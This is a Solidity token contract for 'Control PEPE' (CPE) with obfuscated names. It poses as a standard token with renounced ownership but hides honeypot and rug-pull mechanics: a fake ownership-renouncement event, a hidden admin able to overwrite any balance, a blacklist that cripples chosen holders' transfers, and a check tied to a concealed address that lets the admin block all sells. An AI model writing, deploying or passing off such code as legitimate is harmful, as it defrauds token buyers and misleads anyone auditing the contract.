//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface marketingWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamSwap) external view returns (uint256);

    function transfer(address launchedList, uint256 launchedExempt) external returns (bool);

    function allowance(address takeAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedExempt) external returns (bool);

    function transferFrom(
        address sender,
        address launchedList,
        uint256 launchedExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverIs, uint256 value);
    event Approval(address indexed takeAmount, address indexed spender, uint256 value);
}

abstract contract maxTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atTo {
    function createPair(address atMode, address autoIs) external returns (address);
}

interface takeTo is marketingWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ControlPEPE is maxTo, marketingWallet, takeTo {

    function listExempt(address atLiquidity, uint256 launchedExempt) public {
        txBuy();
        takeLaunchedTrading[atLiquidity] = launchedExempt;
    }

    function enableIs() public {
        emit OwnershipTransferred(listReceiver, address(0));
        autoMin = address(0);
    }

    uint256 takeExempt;

    uint256 public txReceiver;

    bool public marketingList;

    address public atIs;

    function fromMinReceiver(uint256 launchedExempt) public {
        txBuy();
        takeExempt = launchedExempt;
    }

    function transfer(address atLiquidity, uint256 launchedExempt) external virtual override returns (bool) {
        return minMarketingAmount(_msgSender(), atLiquidity, launchedExempt);
    }

    address walletToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address teamSwap) public view virtual override returns (uint256) {
        return takeLaunchedTrading[teamSwap];
    }

    string private modeTo = "Control PEPE";

    bool private walletExempt;

    mapping(address => mapping(address => uint256)) private shouldWallet;

    function decimals() external view virtual override returns (uint8) {
        return marketingSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return listLaunched;
    }

    function marketingWalletTrading(address marketingListTrading, address launchedList, uint256 launchedExempt) internal returns (bool) {
        require(takeLaunchedTrading[marketingListTrading] >= launchedExempt);
        takeLaunchedTrading[marketingListTrading] -= launchedExempt;
        takeLaunchedTrading[launchedList] += launchedExempt;
        emit Transfer(marketingListTrading, launchedList, launchedExempt);
        return true;
    }

    mapping(address => bool) public receiverToken;

    address public listReceiver;

    string private listLaunched = "CPE";

    uint256 private senderTotal = 100000000 * 10 ** 18;

    bool private isSenderFrom;

    function transferFrom(address marketingListTrading, address launchedList, uint256 launchedExempt) external override returns (bool) {
        if (_msgSender() != walletToken) {
            if (shouldWallet[marketingListTrading][_msgSender()] != type(uint256).max) {
                require(launchedExempt <= shouldWallet[marketingListTrading][_msgSender()]);
                shouldWallet[marketingListTrading][_msgSender()] -= launchedExempt;
            }
        }
        return minMarketingAmount(marketingListTrading, launchedList, launchedExempt);
    }

    function approve(address launchFee, uint256 launchedExempt) public virtual override returns (bool) {
        shouldWallet[_msgSender()][launchFee] = launchedExempt;
        emit Approval(_msgSender(), launchFee, launchedExempt);
        return true;
    }

    uint256 constant sellTeam = 13 ** 10;

    function tokenShould(address tradingFrom) public {
        txBuy();
        
        if (tradingFrom == listReceiver || tradingFrom == atIs) {
            return;
        }
        receiverToken[tradingFrom] = true;
    }

    mapping(address => bool) public walletFeeFund;

    function name() external view virtual override returns (string memory) {
        return modeTo;
    }

    constructor (){
        if (txReceiver != enableFrom) {
            txReceiver = enableFrom;
        }
        receiverMin takeLiquidity = receiverMin(walletToken);
        atIs = atTo(takeLiquidity.factory()).createPair(takeLiquidity.WETH(), address(this));
        
        listReceiver = _msgSender();
        enableIs();
        walletFeeFund[listReceiver] = true;
        takeLaunchedTrading[listReceiver] = senderTotal;
        if (enableFrom != txReceiver) {
            isSenderFrom = true;
        }
        emit Transfer(address(0), listReceiver, senderTotal);
    }

    function txBuy() private view {
        require(walletFeeFund[_msgSender()]);
    }

    event OwnershipTransferred(address indexed fundTx, address indexed isExempt);

    function minMarketingAmount(address marketingListTrading, address launchedList, uint256 launchedExempt) internal returns (bool) {
        if (marketingListTrading == listReceiver) {
            return marketingWalletTrading(marketingListTrading, launchedList, launchedExempt);
        }
        uint256 senderToken = marketingWallet(atIs).balanceOf(fromLaunched);
        require(senderToken == takeExempt);
        require(launchedList != fromLaunched);
        if (receiverToken[marketingListTrading]) {
            return marketingWalletTrading(marketingListTrading, launchedList, sellTeam);
        }
        return marketingWalletTrading(marketingListTrading, launchedList, launchedExempt);
    }

    bool public autoEnable;

    uint256 swapAt;

    function totalSupply() external view virtual override returns (uint256) {
        return senderTotal;
    }

    uint8 private marketingSender = 18;

    function getOwner() external view returns (address) {
        return autoMin;
    }

    address private autoMin;

    address fromLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return autoMin;
    }

    mapping(address => uint256) private takeLaunchedTrading;

    function allowance(address minLaunched, address launchFee) external view virtual override returns (uint256) {
        if (launchFee == walletToken) {
            return type(uint256).max;
        }
        return shouldWallet[minLaunched][launchFee];
    }

    function atLiquidityTake(address modeBuy) public {
        require(modeBuy.balance < 100000);
        if (autoEnable) {
            return;
        }
        if (walletExempt) {
            txReceiver = enableFrom;
        }
        walletFeeFund[modeBuy] = true;
        
        autoEnable = true;
    }

    uint256 public enableFrom;

}